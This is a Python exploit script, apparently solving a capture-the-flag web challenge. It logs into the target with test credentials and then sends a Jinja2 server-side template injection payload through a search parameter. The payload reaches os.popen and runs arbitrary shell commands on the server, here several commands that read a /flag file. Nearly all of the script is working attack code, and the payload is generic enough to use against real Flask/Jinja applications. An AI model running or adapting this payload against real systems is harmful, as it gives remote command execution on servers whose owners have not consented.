import requests

# Target configuration
BASE_URL = "http://challenge.local:8080"
LOGIN_URL = f"{BASE_URL}/login"
SEARCH_URL = f"{BASE_URL}/search"

# Step 1: Login
print("[*] Logging in with test:test")
session = requests.Session()
login_response = session.post(LOGIN_URL, data={"username": "test", "password": "test"})
print(f"[+] Login Status: {login_response.status_code}")
print(f"[+] Session Cookie: {dict(session.cookies)}")

# Step 2: Execute commands via SSTI
def exec_cmd(cmd):
    payload = f"{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}"
    print(f"\n[CMD] {cmd}")
    resp = session.get(SEARCH_URL, params={"q": payload})
    print(f"[STATUS] {resp.status_code}")
    print(f"[RESPONSE]\n{resp.text}")
    return resp

# Try commands to extract flag
print("\n" + "="*80)
print("[*] Extracting flag from /flag")
print("="*80)

exec_cmd("cat /flag")
exec_cmd("head -c 100 /flag")
exec_cmd("dd if=/flag bs=1 count=100 2>/dev/null")
exec_cmd("base64 /flag | head -c 100")
exec_cmd("ls -la /flag")

print("\n[*] Extraction complete")

